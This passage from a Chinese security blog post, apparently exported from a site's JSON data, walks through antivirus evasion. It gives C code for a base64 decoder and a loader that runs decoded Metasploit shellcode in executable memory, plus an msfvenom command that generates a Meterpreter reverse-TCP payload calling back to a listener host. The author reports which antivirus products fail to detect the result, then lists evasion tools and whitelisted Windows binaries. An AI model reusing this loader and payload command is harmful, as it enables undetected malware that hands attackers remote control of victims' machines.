class=\"string\">&#x27;6&#x27;</span>, <span class=\"string\">&#x27;7&#x27;</span>, <span class=\"string\">&#x27;8&#x27;</span>, <span class=\"string\">&#x27;9&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;+&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解码时使用</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> base64_suffix_map[<span class=\"number\">256</span>] = &#123;</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">253</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">253</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">253</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,  <span class=\"number\">62</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,  <span class=\"number\">63</span>,</span><br><span class=\"line\">    <span class=\"number\">52</span>,  <span class=\"number\">53</span>,  <span class=\"number\">54</span>,  <span class=\"number\">55</span>,  <span class=\"number\">56</span>,  <span class=\"number\">57</span>,  <span class=\"number\">58</span>,  <span class=\"number\">59</span>,  <span class=\"number\">60</span>,  <span class=\"number\">61</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">254</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,   <span class=\"number\">0</span>,   <span class=\"number\">1</span>,   <span class=\"number\">2</span>,   <span class=\"number\">3</span>,   <span class=\"number\">4</span>,   <span class=\"number\">5</span>,   <span class=\"number\">6</span>,</span><br><span class=\"line\">    <span class=\"number\">7</span>,   <span class=\"number\">8</span>,   <span class=\"number\">9</span>,  <span class=\"number\">10</span>,  <span class=\"number\">11</span>,  <span class=\"number\">12</span>,  <span class=\"number\">13</span>,  <span class=\"number\">14</span>,  <span class=\"number\">15</span>,  <span class=\"number\">16</span>,  <span class=\"number\">17</span>,  <span class=\"number\">18</span>,</span><br><span class=\"line\">    <span class=\"number\">19</span>,  <span class=\"number\">20</span>,  <span class=\"number\">21</span>,  <span class=\"number\">22</span>,  <span class=\"number\">23</span>,  <span class=\"number\">24</span>,  <span class=\"number\">25</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>,  <span class=\"number\">26</span>,  <span class=\"number\">27</span>,  <span class=\"number\">28</span>,  <span class=\"number\">29</span>,  <span class=\"number\">30</span>,  <span class=\"number\">31</span>,  <span class=\"number\">32</span>,  <span class=\"number\">33</span>,  <span class=\"number\">34</span>,  <span class=\"number\">35</span>,  <span class=\"number\">36</span>,</span><br><span class=\"line\">    <span class=\"number\">37</span>,  <span class=\"number\">38</span>,  <span class=\"number\">39</span>,  <span class=\"number\">40</span>,  <span class=\"number\">41</span>,  <span class=\"number\">42</span>,  <span class=\"number\">43</span>,  <span class=\"number\">44</span>,  <span class=\"number\">45</span>,  <span class=\"number\">46</span>,  <span class=\"number\">47</span>,  <span class=\"number\">48</span>,</span><br><span class=\"line\">    <span class=\"number\">49</span>,  <span class=\"number\">50</span>,  <span class=\"number\">51</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">char</span> <span class=\"title function_\">cmove_bits</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> src, <span class=\"type\">unsigned</span> lnum, <span class=\"type\">unsigned</span> rnum)</span> &#123;</span><br><span class=\"line\">    src &lt;&lt;= lnum; <span class=\"comment\">// src = src &lt;&lt; lnum;</span></span><br><span class=\"line\">    src &gt;&gt;= rnum; <span class=\"comment\">// src = src &gt;&gt; rnum;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> src;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">base64_encode</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *indata, <span class=\"type\">int</span> inlen, <span class=\"type\">char</span> *outdata, <span class=\"type\">int</span> *outlen)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> ret = <span class=\"number\">0</span>; <span class=\"comment\">// return value</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (indata == <span class=\"literal\">NULL</span> || inlen == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret = <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> in_len = <span class=\"number\">0</span>; <span class=\"comment\">// 源字符串长度, 如果in_len不是3的倍数, 那么需要补成3的倍数</span></span><br><span class=\"line\">    <span class=\"type\">int</span> pad_num = <span class=\"number\">0</span>; <span class=\"comment\">// 需要补齐的字符个数, 这样只有2, 1, 0(0的话不需要拼接, )</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (inlen % <span class=\"number\">3</span> != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        pad_num = <span class=\"number\">3</span> - inlen % <span class=\"number\">3</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    in_len = inlen + pad_num; <span class=\"comment\">// 拼接后的长度, 实际编码需要的长度(3的倍数)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> out_len = in_len * <span class=\"number\">8</span> / <span class=\"number\">6</span>; <span class=\"comment\">// 编码后的长度</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> *p = outdata; <span class=\"comment\">// 定义指针指向传出data的首地址</span></span><br><span class=\"line\"></span><br><span class=\"line\">                       <span class=\"comment\">//编码, 长度为调整后的长度, 3字节一组</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; in_len; i += <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> value = *indata &gt;&gt; <span class=\"number\">2</span>; <span class=\"comment\">// 将indata第一个字符向右移动2bit(丢弃2bit)</span></span><br><span class=\"line\">        <span class=\"type\">char</span> c = base64_alphabet[value]; <span class=\"comment\">// 对应base64转换表的字符</span></span><br><span class=\"line\">        *p = c; <span class=\"comment\">// 将对应字符(编码后字符)赋值给outdata第一字节</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//处理最后一组(最后3字节)的数据</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i == inlen + pad_num - <span class=\"number\">3</span> &amp;&amp; pad_num != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (pad_num == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                *(p + <span class=\"number\">1</span>) = base64_alphabet[(<span class=\"type\">int</span>)(cmove_bits(*indata, <span class=\"number\">6</span>, <span class=\"number\">2</span>) + cmove_bits(*(indata + <span class=\"number\">1</span>), <span class=\"number\">0</span>, <span class=\"number\">4</span>))];</span><br><span class=\"line\">                *(p + <span class=\"number\">2</span>) = base64_alphabet[(<span class=\"type\">int</span>)cmove_bits(*(indata + <span class=\"number\">1</span>), <span class=\"number\">4</span>, <span class=\"number\">2</span>)];</span><br><span class=\"line\">                *(p + <span class=\"number\">3</span>) = <span class=\"string\">&#x27;=&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pad_num == <span class=\"number\">2</span>) &#123; <span class=\"comment\">// 编码后的数据要补两个 &#x27;=&#x27;</span></span><br><span class=\"line\">                *(p + <span class=\"number\">1</span>) = base64_alphabet[(<span class=\"type\">int</span>)cmove_bits(*indata, <span class=\"number\">6</span>, <span class=\"number\">2</span>)];</span><br><span class=\"line\">                *(p + <span class=\"number\">2</span>) = <span class=\"string\">&#x27;=&#x27;</span>;</span><br><span class=\"line\">                *(p + <span class=\"number\">3</span>) = <span class=\"string\">&#x27;=&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123; <span class=\"comment\">// 处理正常的3字节的数据</span></span><br><span class=\"line\">            *(p + <span class=\"number\">1</span>) = base64_alphabet[cmove_bits(*indata, <span class=\"number\">6</span>, <span class=\"number\">2</span>) + cmove_bits(*(indata + <span class=\"number\">1</span>), <span class=\"number\">0</span>, <span class=\"number\">4</span>)];</span><br><span class=\"line\">            *(p + <span class=\"number\">2</span>) = base64_alphabet[cmove_bits(*(indata + <span class=\"number\">1</span>), <span class=\"number\">4</span>, <span class=\"number\">2</span>) + cmove_bits(*(indata + <span class=\"number\">2</span>), <span class=\"number\">0</span>, <span class=\"number\">6</span>)];</span><br><span class=\"line\">            *(p + <span class=\"number\">3</span>) = base64_alphabet[*(indata + <span class=\"number\">2</span>) &amp; <span class=\"number\">0x3f</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        p += <span class=\"number\">4</span>;</span><br><span class=\"line\">        indata += <span class=\"number\">3</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (outlen != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        *outlen = out_len;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">base64_decode</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *indata, <span class=\"type\">int</span> inlen, <span class=\"type\">char</span> *outdata)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (indata == <span class=\"literal\">NULL</span> || inlen &lt;= <span class=\"number\">0</span> || outdata == <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret = <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (inlen % <span class=\"number\">4</span> != <span class=\"number\">0</span>) &#123; <span class=\"comment\">// 需要解码的数据不是4字节倍数</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret = <span class=\"number\">-2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> t = <span class=\"number\">0</span>, x = <span class=\"number\">0</span>, y = <span class=\"number\">0</span>, i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> c = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> g = <span class=\"number\">3</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (indata[x] != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 需要解码的数据对应的ASCII值对应base64_suffix_map的值</span></span><br><span class=\"line\">        c = base64_suffix_map[indata[x++]];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c == <span class=\"number\">255</span>) <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;<span class=\"comment\">// 对应的值不在转码表中</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c == <span class=\"number\">253</span>) <span class=\"keyword\">continue</span>;<span class=\"comment\">// 对应的值是换行或者回车</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c == <span class=\"number\">254</span>) &#123; c = <span class=\"number\">0</span>; g--; &#125;<span class=\"comment\">// 对应的值是&#x27;=&#x27;</span></span><br><span class=\"line\">        t = (t &lt;&lt; <span class=\"number\">6</span>) | c; <span class=\"comment\">// 将其依次放入一个int型中占3字节</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (++y == <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">            outdata[i++] = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)((t &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (g &gt; <span class=\"number\">1</span>) outdata[i++] = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)((t &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (g &gt; <span class=\"number\">2</span>) outdata[i++] = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(t &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">            y = t = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>base64.h</code>文件内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> base64_h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> base64_h</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> __cplusplus</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span> &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">base64_encode</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *indata, <span class=\"type\">int</span> inlen, <span class=\"type\">char</span> *outdata, <span class=\"type\">int</span> *outlen)</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">base64_decode</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *indata, <span class=\"type\">int</span> inlen, <span class=\"type\">char</span> *outdata)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> __cplusplus</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">/* base64_h */</span></span></span><br></pre></td></tr></table></figure>\n\n<p><code>shellcode.c</code>文件内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;base64.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> buf[] =</span><br><span class=\"line\"><span class=\"string\">&quot;msf base64 code&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> * argv[])</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> str3[<span class=\"number\">1000</span>] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 原po代码报错，这里做了一些强制转换和类型修正</span></span><br><span class=\"line\">    base64_decode(buf, (<span class=\"type\">int</span>)<span class=\"built_in\">strlen</span>(buf), str3);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> *Memory;</span><br><span class=\"line\"></span><br><span class=\"line\">    Memory = VirtualAlloc(<span class=\"literal\">NULL</span>, <span class=\"keyword\">sizeof</span>(str3), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(Memory, str3, <span class=\"keyword\">sizeof</span>(str3));</span><br><span class=\"line\"></span><br><span class=\"line\">    ((<span class=\"type\">void</span>(*)())Memory)();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>使用msf生成base64编码的shellcode：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.174.128 lport=6666  -f c &gt; shell.c</span><br></pre></td></tr></table></figure>\n\n<p>把<code>shell.c</code>的内容复制到上面<code>shellcode.c</code>文件中。vs2019编译，关闭杀软，msf可成功上线。</p>\n<p>打开杀软，火绒可以查杀，<strong>360不能查杀</strong>。</p>\n<p>virustotal.com上查杀率为17&#x2F;67（原po为28&#x2F;69）。</p>\n<p><img src=\"/./images/202205301558330.png\" alt=\"image-20220530155809229\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>与2020年相比，2022年卷了很多。纵览360和火绒就能直观感受到，确实杀软能力越来越强了。2020年可以Bypass卡巴斯基、McAfee、Symantec等杀软的方法，2022年均失效。</p>\n<p>免杀操作层出不穷，特别是近两年也有很多新的优秀项目。本文仅为最基本的免杀方式，前路漫漫，还有很多要学习的，共勉。</p>\n<p>一些知识点：</p>\n<ul>\n<li>常见免杀工具（21种）：msf自免杀、Veil、Venom、Shellter、BackDoor-Factory、Avet、TheFatRat、Avoidz、Green-Hat-Suite、zirikatu、AVIator、DKMC、Unicorn、Python-Rootkit、DKMC、Unicorn、Python-Rootkit、ASWCrypter、nps_payload、GreatSCT、HERCULES、SpookFlare、SharpShooter、CACTUSTORCH、Winpayload等。</li>\n<li>常见免杀编程语言：C&#x2F;C++、C#、python、powershell、ruby、go等。</li>\n<li>常见免杀白名单程序（113个）：Rundll32.exe、Msiexec.exe、MSBuild.exe、InstallUtil.exe、Mshta.exe、Regsvr32.exe、Cmstp.exe、CScript.exe、WScript.exe、Forfiles.exe、te.exe、Odbcconf.exe、InfDefaultInstall.exe、Diskshadow.exe、PsExec.exe、Msdeploy.exe、Winword.exe、Regasm.exe、Regsvcs.exe、Ftp.exe、pubprn.vbs、winrm.vbs、slmgr.vbs、Xwizard.exe、Compiler.exe、IEExec.exe、MavInject32、Presentationhost.exe、Wmic.exe、Pcalua.exe、Url.dll、zipfldr.dll、Syncappvpublishingserver.vbs等。</li>\n</ul>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li>BypassAntiVirus：远控免杀系列文章 <a href=\"https://github.com/TideSec/BypassAntiVirus\">https://github.com/TideSec/BypassAntiVirus</a></li>\n<li>AntivirusScanner：杀软进程检测脚本 <a href=\"https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/AntivirusScanner\">https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/AntivirusScanner</a><br></style></li>\n</ul>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cm8iuwsr00001rcn1bqy3f252","tag_id":"cm8iuwsr40003rcn1h1nj2gl1","_id":"cm8iuwsr60007rcn14b4gck44"},{"post_id":"cm8iuwsr70008rcn10xwu5x13","tag_id":"cm8iuwsr40003rcn1h1nj2gl1","_id":"cm8iuwsr8000arcn1gxyr4erj"},{"post_id":"cm8iuwsr80009rcn1gfe6cqnp","tag_id":"cm8iuwsr40003rcn1h1nj2gl1","_id":"cm8iuwsr9000crcn1547a5twp"},{"post_id":"cm8iuwsr9000brcn13vkog1l0","tag_id":"cm8iuwsr40003rcn1h1nj2gl1","_id":"cm8iuwsr9000ercn17wo29ogd"},{"post_id":"cm8iuwsr9000drcn13pdcc4vh","tag_id":"cm8iuwsr40003rcn1h1nj2gl1","_id":"cm8iuwsra000frcn1hf9td072"}],"Tag":[{"name":"攻防知识","_id":"cm8iuwsr40003rcn1h1nj2gl1"}]}}